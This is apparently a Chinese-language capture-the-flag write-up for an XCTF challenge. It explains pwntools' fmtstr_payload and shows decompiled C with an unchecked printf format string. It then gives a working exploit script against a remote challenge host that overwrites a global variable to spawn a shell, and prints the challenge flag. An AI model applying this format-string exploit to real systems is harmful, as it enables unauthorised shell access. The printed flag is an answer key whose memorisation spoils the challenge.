# 实时数据监测

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=c17a14e0-9bc1-4370-ab33-7348e06f55f2_2)

我宣布pwntools就是神！记录一下这个好用工具的最简单用法。其实格式化字符串任意写的原理我还不是很懂，找个时间学习一下，到时候顺便写个笔记（到处挖坑）。

首先pwntools有一个[fmtstr](https://docs.pwntools.com/en/stable/fmtstr.html)工具。看官方文档好像还可以自动pwn，但是我这个机子没法运行elf，所以还是半自动吧，已经把最难的部分帮我完成了。

- ### fmtstr_payload
  > 根据给定的参数自动生成payload，32位和64位都可以。写入地址的大小由context.bits决定。
  - 语法：pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') → str
  - 参数
    > offset (int) – 格式化字符串中第一个可控制参数的偏移
    > writes (dict) – 要写入地址：写入内容 的字典
    > numbwritten (int) – 打印格式化字符串之前printf已经打印的字节数
    > write_size (str) – 必须为byte, short 或者 int，表示你想使用hhn，hn或者n进行写入。
    > overflows (int) – 为了减少格式化字符串所可以接受的额外溢出。此参数是格式化字符串长度与输出数量的交换。越大的值所生成的payload越短，同时运行时的输出越多。
    > strategy (str) – fast或者small。small为默认，fast可以使用在有多处写入的地方
   - 返回值：根据参数得出的payload。

个人渣翻，有些还没看懂。main函数很简单，内部调用了locker，这才是关键点。

```c
void locker(void)
{
  char local_20c [520];
  fgets(local_20c,512,stdin);
  imagemagic(local_20c);
  if (key == 0x2223322) {
    system("/bin/sh");
  }
  else {
    printf(&DAT_080485d8,&key,key);
  }
  return;
}
```

如果key的值等于0x2223322就可以得到shell。imagemagic就是个格式化字符串漏洞。

```c
void imagemagic(char *param_1)
{
  printf(param_1);
  return;
}
```

查看key的地址为0x0804a048。checksec的结果为保护全没开。现在就很简单了。

```python
from pwn import *
proc=remote('61.147.171.105',65082)
payload=fmtstr_payload(12,{0x0804a048:0x02223322})
proc.sendline(payload)
proc.interactive()
```

- ### Flag
    > cyberpeace{20c648141e5e28319d890841074e93fc}